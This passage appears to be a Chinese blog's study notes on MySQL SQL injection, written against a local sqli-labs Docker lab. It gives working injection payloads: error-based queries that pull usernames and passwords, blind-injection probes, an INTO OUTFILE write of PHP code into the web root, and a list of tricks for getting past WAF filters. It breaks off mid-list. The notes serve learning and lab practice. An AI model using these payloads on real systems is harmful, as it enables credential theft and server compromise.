MySQL相关知识</h3><p>​\t在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>\n<h4 id=\"1-1-1-Navicat连接Docker容器内MySQL\"><a href=\"#1-1-1-Navicat连接Docker容器内MySQL\" class=\"headerlink\" title=\"1.1.1 Navicat连接Docker容器内MySQL\"></a>1.1.1 Navicat连接Docker容器内MySQL</h4><blockquote>\n<p>有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里需要给MySQL开一个端口映射，我这里给的是<code>3307</code>端口。</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker <span class=\"built_in\">exec</span> -it sqli-labs /bin/bash</span><br><span class=\"line\">$ mysql</span><br></pre></td></tr></tbody></table></figure>\n\n<p>接下来将host修改为<code>%</code>即可。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> host,<span class=\"keyword\">user</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">'root'</span>;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure>\n\n<style>.pienrgywnrhj{zoom:50%;}</style><img src=\"/posts/31899/image-20250306000604769.png\" class=\"pienrgywnrhj\" alt=\"image-20250306000604769\">\n\n\n<h3 id=\"1-2-判断是否存在注入\"><a href=\"#1-2-判断是否存在注入\" class=\"headerlink\" title=\"1.2 判断是否存在注入\"></a>1.2 判断是否存在注入</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">2</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"string\">'1'</span><span class=\"keyword\">or</span><span class=\"string\">'1'</span><span class=\"operator\">=</span><span class=\"string\">'1'</span></span><br><span class=\"line\">id<span class=\"operator\">=</span>\"1\"<span class=\"keyword\">or</span>\"1\"<span class=\"operator\">=</span>\"1\"</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>有回显</strong>：页面有数据信息返回。</p>\n<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>\n<h3 id=\"1-3-SQL注释符\"><a href=\"#1-3-SQL注释符\" class=\"headerlink\" title=\"1.3 SQL注释符\"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>\n<p><code>--空格</code>：单行注释，注意后面有个空格。</p>\n<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>\n<h3 id=\"1-4-SQL注入分类\"><a href=\"#1-4-SQL注入分类\" class=\"headerlink\" title=\"1.4 SQL注入分类\"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>\n<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>\n<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>\n<h4 id=\"1-4-1-报错注入\"><a href=\"#1-4-1-报错注入\" class=\"headerlink\" title=\"1.4.1 报错注入\"></a>1.4.1 报错注入</h4><p><strong>XPATH报错注入</strong></p>\n<p><code>updatexml（XML_document，XPath_string，new_value）</code>、<code>extractvalue（XML_document，xpath_string）</code>，XPATH的格式形如<code>/test</code>，如果XPATH出现格式错误，则会爆出XPATH语法错误。</p>\n<p><strong>floor()函数报错</strong></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>),concat(<span class=\"string\">'x'</span>,<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>rand(0)</code>的重复计算是固定的，会随机生成一个[0,1]的小数，<code>rand(0)*2</code>则生成[0,2]的数，<code>floor()</code>函数是向下取整，即最后结果为0或1。我们运行一下看看。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>) <span class=\"keyword\">from</span> information_schema.tables limit <span class=\"number\">0</span>,<span class=\"number\">8</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/31899/image-20250306001213412.png\" class=\"\" title=\"image-20250306001213412\">\n\n<p>可以发现这里<code>floor(rand(0)*2)</code>的值是固定的。</p>\n<p>接下来说一下<code>group by</code>的原理，<code>group by</code>在执行时，会依次取出查询表中的记录创建一个临时表，<code>group by</code>的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则<strong>插入</strong>。再来看这个SQL语句。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>),concat(<span class=\"string\">'x'</span>,<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其键必然为<code>x1</code>或者<code>x0</code>，那么应该只会值增加呀，为什么会报错呢？</p>\n<p>这里有个重要特性：当<code>group by</code>和<code>rand()</code>同时使用时，若该临时表中没有主键，则插入前<code>rand()</code>会再执行一次。</p>\n<p>那么我们来推断一下，第一次执行，<code>key</code>应该为<code>x0</code>，但是<code>x0</code>不存在，因此<code>rand(0)</code>又计算了一遍，最终第一次执行结果为<code>x1</code>。</p>\n<p>第二次执行，这时候<code>key</code>应该为<code>x1</code>，已存在，则值加一即可。</p>\n<p>第三次执行，这时候key应该为<code>x0</code>，不存在，<code>rand(0)</code>重新计算一遍，最终应该插入的<code>key</code>为<code>x1</code>，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。</p>\n<img src=\"/posts/31899/image-20250306003105176.png\" class=\"\" title=\"image-20250306003105176\">\n\n<p><strong>优化方案</strong></p>\n<p>学习的<a href=\"https://www.freebuf.com/articles/web/257881.html\">这篇文章</a>，将<code>rand(0)</code>改为了<code>rand(14)</code>，运行一下看看。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">select</span> <span class=\"built_in\">floor</span>(rand(<span class=\"number\">14</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>) <span class=\"keyword\">from</span> information_schema.tables limit <span class=\"number\">0</span>,<span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> <span class=\"built_in\">floor</span>(rand(<span class=\"number\">14</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>) <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-------------------+</span></span><br><span class=\"line\"><span class=\"number\">8</span> <span class=\"keyword\">rows</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里只需要两条数据即可报错，但是如果只有一条数据<code>floor()</code>报错注入就不能用了，因为一条数据没办法重复。</p>\n<h4 id=\"1-4-2-ORDER-BY注入\"><a href=\"#1-4-2-ORDER-BY注入\" class=\"headerlink\" title=\"1.4.2 ORDER BY注入\"></a>1.4.2 ORDER BY注入</h4><p>主要是不能使用联合注入，还有一些函数区别。</p>\n<p><strong>验证方式</strong></p>\n<p>升序降序</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">asc</span> # 升序</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">desc</span> # 降序</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>rand()</code>函数验证，<code>rand()</code>每次结果随机，因此查询出结果顺序也是随机。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span>rand()</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> rand()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>延时验证，延时的时间为 (行数 * 1) 秒</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span>sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> sleep(<span class=\"number\">1</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>利用方式</strong></p>\n<p>报错注入</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>),concat((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x)a)<span class=\"operator\">%</span><span class=\"number\">23</span> # <span class=\"built_in\">floor</span>()</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">procedure</span> analyse(extractvalue(rand(),concat(<span class=\"number\">0x3a</span>,version())),<span class=\"number\">1</span>) # <span class=\"keyword\">procedure</span> analyse</span><br></pre></td></tr></tbody></table></figure>\n\n<p>布尔盲注和时间盲注使用<code>rand()</code>函数即可</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span>rand(<span class=\"keyword\">left</span>(database(),<span class=\"number\">1</span>)<span class=\"operator\">&gt;</span><span class=\"string\">'r'</span>)</span><br><span class=\"line\">?sort<span class=\"operator\">=</span>rand(if(ascii(substr(database(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">114</span>,<span class=\"number\">1</span>,sleep(<span class=\"number\">1</span>)))</span><br></pre></td></tr></tbody></table></figure>\n\n<p>写入文件，使用<code>lines terminated by</code>，<code>0x3c3f70687020706870696e666f28293b3f3e</code>是<code>&lt;php phpinfo();&gt;</code>的十六进制编码。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">into</span> outfile \"/var/www/html/less46.php\" lines terminated <span class=\"keyword\">by</span> <span class=\"number\">0x3c3f70687020706870696e666f28293b3f3e</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"2-SQL注入绕过\"><a href=\"#2-SQL注入绕过\" class=\"headerlink\" title=\"2. SQL注入绕过\"></a>2. SQL注入绕过</h2><h3 id=\"2-1-空格字符绕过\"><a href=\"#2-1-空格字符绕过\" class=\"headerlink\" title=\"2.1 空格字符绕过\"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>\n<p><code>%09</code>：TAB键（水平）</p>\n<p><code>%0a</code>：新建一行</p>\n<p><code>%0c</code>：新的一页</p>\n<p><code>%0d</code>：return功能</p>\n<p><code>%0b</code>：TAB键（垂直）</p>\n<p><code>%00</code>：空字符</p>\n<p><code>/**/</code>：替换空格</p>\n<p><code>/*!*/</code>：内联注释</p>\n<h3 id=\"2-2-大小写绕过\"><a href=\"#2-2-大小写绕过\" class=\"headerlink\" title=\"2.2 大小写绕过\"></a>2.2 大小写绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">-</span><span class=\"operator\">&gt;</span> <span class=\"keyword\">UniOn</span> <span class=\"keyword\">SelEcT</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-3-浮点数绕过\"><a href=\"#2-3-浮点数绕过\" class=\"headerlink\" title=\"2.3 浮点数绕过\"></a>2.3 浮点数绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8E0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8.0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-4-NULL绕过\"><a href=\"#2-4-NULL绕过\" class=\"headerlink\" title=\"2.4 NULL绕过\"></a>2.4 NULL绕过</h3><p><code>\\N</code>代表NULL</p>\n<h3 id=\"2-5-引号绕过\"><a href=\"#2-5-引号绕过\" class=\"headerlink\" title=\"2.5 引号绕过\"></a>2.5 引号绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span>\"1\" #双引号绕过</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"number\">0x61646D696E</span>; # 字符串转换为<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(column_name)</span><br><span class=\"line\"><span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> TABLE_NAME<span class=\"operator\">=</span><span class=\"string\">'users'</span> limit <span class=\"number\">1</span>),<span class=\"number\">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-6-添加库名绕过\"><a href=\"#2-6-添加库名绕过\" class=\"headerlink\" title=\"2.6 添加库名绕过\"></a>2.6 添加库名绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> test.users;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-7-去重复绕过\"><a href=\"#2-7-去重复绕过\" class=\"headerlink\" title=\"2.7 去重复绕过\"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,version() fromusers;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-8-反引号绕过\"><a href=\"#2-8-反引号绕过\" class=\"headerlink\" title=\"2.8 反引号绕过\"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> `test.users`;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-9-语言特性绕过\"><a href=\"#2-9-语言特性绕过\" class=\"headerlink\" title=\"2.9 语言特性绕过\"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">服务器中间件</th>\n<th align=\"center\">解析结果</th>\n<th align=\"center\">举例说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">ASP.NET/IIS</td>\n<td align=\"center\">所有出现的参数值用逗号连接</td>\n<td align=\"center\">color=red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">ASP/IIS</td>\n<td align=\"center\">所有出现的参数用逗号连接</td>\n<td align=\"center\">color=red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP/Apache</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color=blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP/Zeus</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color=blue</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet/Apache Tomcat</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet/Oracle Application Server 10g</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet/Jetty</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">IBM Lotus Domino</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color=blue</td>\n</tr>\n<tr>\n<td align=\"center\">IBM HTTP Server</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_perl,libapreq2/Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">Perl CGI/Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_wsgi(Python)/Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">Python/Zope</td>\n<td align=\"center\">转化为List</td>\n<td align=\"center\">color=[‘red’,’blue’]</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-10-逗号绕过\"><a href=\"#2-10-逗号绕过\" class=\"headerlink\" title=\"2.10 逗号绕过\"></a>2.10 逗号绕过</h3><p><code>substr</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>(substr(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>mid</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> mid(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>join</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)a <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> <span class=\"number\">2</span>)b</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>like</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() <span class=\"keyword\">like</span> <span class=\"string\">'%r%'</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>offset</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">limit <span class=\"number\">1</span> <span class=\"keyword\">offset</span> <span class=\"number\">0</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-11-or-and-xor-not绕过\"><a href=\"#2-11-or-and-xor-not绕过\" class=\"headerlink\" title=\"2.11 or and xor not绕过\"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>\n<p><code>||</code>等价于or</p>\n<p><code>!</code>等价于not</p>\n<p><code>|</code>等价于xor</p>\n<h3 id=\"2-12-ASCII字符对比绕过\"><a href=\"#2-12-ASCII字符对比绕过\" class=\"headerlink\" title=\"2.12 ASCII字符对比绕过\"></a>2.12 ASCII字符对比绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">=</span><span class=\"number\">114</span>; # <span class=\"type\">char</span>(<span class=\"number\">114</span>)<span class=\"operator\">=</span><span class=\"string\">'r'</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-13-等号绕过\"><a href=\"#2-13-等号绕过\" class=\"headerlink\" title=\"2.13 等号绕过\"></a>2.13 等号绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&lt;</span><span class=\"number\">115</span>; # <span class=\"operator\">&gt;</span> <span class=\"operator\">&lt;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"keyword\">like</span> <span class=\"string\">'r%'</span>; #<span class=\"keyword\">like</span> 